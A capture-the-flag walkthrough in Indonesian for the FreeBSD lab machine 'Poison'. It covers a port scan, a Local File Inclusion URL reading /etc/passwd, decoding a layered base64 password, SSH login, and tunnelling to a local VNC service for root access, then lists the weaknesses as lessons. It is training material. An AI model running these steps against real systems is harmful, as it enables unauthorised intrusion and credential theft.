**OS**: FreeBSD  
**Difficulty**: Medium  
**IP**: 10.10.10.84

```bash
rustscan -a 10.10.10.84 --ulimit 1000 -r 1-65535 -- -A -sC -Pn
22/tcp open  ssh     syn-ack OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
| ssh-hostkey: 
|   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDFLpOCLU3rRUdNNbb5u5WlP+JKUpoYw4znHe0n4mRlv5sQ5kkkZSDNMqXtfWUFzevPaLaJboNBOAXjPwd1OV1wL2YFcGsTL5MOXgTeW4ixpxNBsnBj67mPSmQSaWcudPUmhqnT5VhKYLbPk43FsWqGkNhDtbuBVo9/BmN+GjN1v7w54PPtn8wDd7Zap3yStvwRxeq8E0nBE4odsfBhPPC01302RZzkiXymV73WqmI8MeF9W94giTBQS5swH6NgUe4/QV1tOjTct/uzidFx+8bbcwcQ1eUgK5DyRLaEhou7PRlZX6Pg5YgcuQUlYbGjgk6ycMJDuwb2D5mJkAzN4dih
|   256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKXh613KF4mJTcOxbIy/3mN/O/wAYht2Vt4m9PUoQBBSao16RI9B3VYod1HSbx3PYsPpKmqjcT7A/fHggPIzDYU=
|   256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJrg2EBbG5D2maVLhDME5mZwrvlhTXrK7jiEI+MiZ+Am
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32

```
### **Web Enumeration**

Mengakses `http://10.10.10.84/listfiles.php` menemukan directory listing yang menampilkan beberapa file PHP dan `pwdbackup.txt`

## **Akses Awal**

### **Penemuan Password**

Mendapatkan password terenkripsi dari `pwdbackup.txt`
```bash
curl -o pwdbackup.txt http://10.10.10.84/browse.php?file=pwdbackup.txt
```

### **Dekode Base64**

Membuat script dekode otomatis
```bash
content=$(cat pwdbackup.txt)
for i in {1..20}; do
    content=$(echo "$content" | base64 -d 2>/dev/null)
    echo "Attempt $i: $content"
    # Stop jika sudah tidak bisa decode lagi
    if echo "$content" | base64 -d &>/dev/null; then
        continue
    else
        echo "Final password: $content"
        break
    fi
done

```

**Hasil:** Setelah 13 lapis dekode, mendapatkan password: `Charix!2#4%6&8(0`
```bash
Attempt 10: VVRKb2FHTnRiRFJKVkVscVRrTlZNa3BxWjI5TlFUMDlDZz09Cg==
Attempt 11: UTJoaGNtbDRJVElqTkNVMkpqZ29NQT09Cg==
Attempt 12: Q2hhcml4ITIjNCU2JjgoMA==
Attempt 13: Charix!2#4%6&8(0
Final password: Charix!2#4%6&8(0
```
### **Kerentanan LFI**

Mengkonfirmasi kerentanan Local File Inclusion
```text
http://10.10.10.84/browse.php?file=/etc/passwd
```
Menemukan user `charix` di `/etc/passwd`
![[Pasted image 20251112224017.png]]
## **Akses User**

### **Login SSH**
```bash
ssh charix@10.10.10.84
```
Password: `Charix!2#4%6&8(0`
### **User Flag**

Menemukan user flag di `/home/charix/user.txt`

## Privilege Escalation

### **Penemuan**

Menemukan `secret.zip` di direktori `/home/charix/`.

### **Enumerasi Service**
```bash
sockstat -l -4
USER     COMMAND    PID   FD PROTO  LOCAL ADDRESS         FOREIGN ADDRESS      
www      httpd      1917  4  tcp4   *:80                  *:*
www      httpd      1908  4  tcp4   *:80                  *:*
www      httpd      1899  4  tcp4   *:80                  *:*
www      httpd      1866  4  tcp4   *:80                  *:*
www      httpd      1865  4  tcp4   *:80                  *:*
www      httpd      1853  4  tcp4   *:80                  *:*
www      httpd      1770  4  tcp4   *:80                  *:*
www      httpd      1698  4  tcp4   *:80                  *:*
www      httpd      1694  4  tcp4   *:80                  *:*
www      httpd      1477  4  tcp4   *:80                  *:*
root     sendmail   642   3  tcp4   127.0.0.1:25          *:*
root     httpd      625   4  tcp4   *:80                  *:*
root     sshd       620   4  tcp4   *:22                  *:*
root     Xvnc       529   1  tcp4   127.0.0.1:5901        *:*
root     Xvnc       529   3  tcp4   127.0.0.1:5801        *:*
root     syslogd    390   7  udp4   *:514                 *:*

```
### **Transfer File**

Memindahkan file secret ke mesin penyerang:
```bash
scp charix@10.10.10.84:/home/charix/secret .
```

### **SSH Tunneling**

Membuat tunnel untuk mengakses service VNC:

```bash
ssh -L 5901:127.0.0.1:5901 charix@10.10.10.84
```
### **Koneksi VNC**

Terhubung ke VNC menggunakan secret sebagai password:

```bash
vncviewer -passwd secret 127.0.0.1:5901
```
## **Akses Root**

Berhasil mendapatkan root shell melalui sesi VNC dan mengambil root flag dari `/root/root.txt`.

## **Kerentanan Utama**

1. **Local File Inclusion (LFI)** di aplikasi PHP
    
2. **Enkoding password lemah** (multiple layer base64)
    
3. **Service VNC terekspos lokal** dengan autentikasi lemah
    
4. **Segmentasi jaringan tidak cukup** memungkinkan SSH tunneling

## **Langkah-Langkah Penting**

### **1. Information Gathering**

- Scan port
    
- Enumerasi web application
### **2. Eksploitasi Awal**

- Manfaatkan LFI untuk baca file sistem
    
- Decode password dari pwdbackup.txt
    
- Akses SSH dengan credential yang didapat
### **3. Post-Exploitation**

- Enumerasi service dan proses
    
- Transfer file secret VNC
    
- Buat SSH tunnel untuk bypass restriksi jaringan
### **4. Privilege Escalation**

- Gunakan VNC dengan password binary
    
- Akses root shell melalui VNC session
    

**Kesimpulan:** Mesin Poison menunjukkan pentingnya input validation dan konfigurasi service yang aman, terutama untuk service seperti VNC yang seharusnya tidak diakses secara publik
